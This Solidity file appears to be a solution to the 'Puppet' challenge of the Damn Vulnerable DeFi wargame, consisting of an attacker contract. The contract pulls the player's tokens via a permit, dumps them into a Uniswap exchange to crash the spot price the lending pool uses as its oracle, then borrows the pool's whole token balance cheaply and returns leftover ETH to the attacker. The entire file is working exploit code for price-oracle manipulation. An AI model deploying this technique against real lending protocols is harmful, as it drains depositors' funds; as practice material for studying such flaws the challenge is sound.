// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../puppet/PuppetPool.sol";
import "../DamnValuableToken.sol";

contract PuppetPoolAttacker  {
    uint256 public constant POOL_INITIAL_TOKEN_BALANCE = 100000 * 1e18;
    uint256 public constant PLAYER_INITIAL_TOKEN_BALANCE = 1000 * 1e18;
    uint256 public constant UNISWAP_INITIAL_ETH_RESERVE = 10 * 1e18;

    struct Permit {
        address owner;
        address spender;
        uint256 value;
        uint256 deadline;
        uint8 v;
        bytes32 r;
        bytes32 s;
    }
    constructor(PuppetPool target, DamnValuableToken damnValuableToken, address uniswapExchange, uint256 amount, Permit memory permit) payable {
        address attacker = msg.sender;
        damnValuableToken.permit{gas: 300000}(permit.owner, permit.spender, permit.value, permit.deadline, permit.v, permit.r, permit.s);
        damnValuableToken.transferFrom(attacker, address(this), PLAYER_INITIAL_TOKEN_BALANCE);
        damnValuableToken.approve(uniswapExchange, PLAYER_INITIAL_TOKEN_BALANCE);

        (bool success,) = uniswapExchange.call{gas: 1e6}(abi.encodeWithSignature("tokenToEthSwapOutput(uint256,uint256,uint256)", UNISWAP_INITIAL_ETH_RESERVE - 1e17, PLAYER_INITIAL_TOKEN_BALANCE, block.timestamp));
        require(success);
        damnValuableToken.transfer(uniswapExchange, damnValuableToken.balanceOf(address(this)));

        target.borrow{value: address(this).balance}(POOL_INITIAL_TOKEN_BALANCE, attacker);

        payable(attacker).transfer(address(this).balance); // payback ethers
    }
}